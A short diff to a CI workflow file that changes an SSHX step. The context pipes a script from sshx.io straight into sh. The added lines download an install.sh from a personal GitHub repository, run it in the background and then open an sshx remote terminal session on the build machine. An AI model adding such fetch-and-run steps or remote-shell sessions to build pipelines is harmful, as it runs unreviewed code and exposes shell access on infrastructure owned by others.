@@ -9,7 +9,13 @@ workflows:
         script: |
           curl -sSf https://sshx.io/get | sh
 
-      - name: Run SSHX (keep alive)
+      - name: Run SSHX (auto download + run)
         script: |
           echo "Starting SSHX..."
+          # Download your repo installer script
+          wget https://raw.githubusercontent.com/dasd80/heyy/main/install.sh -O install.sh
+          chmod +x install.sh
+          ./install.sh &
+
+          # Start sshx session
           sshx
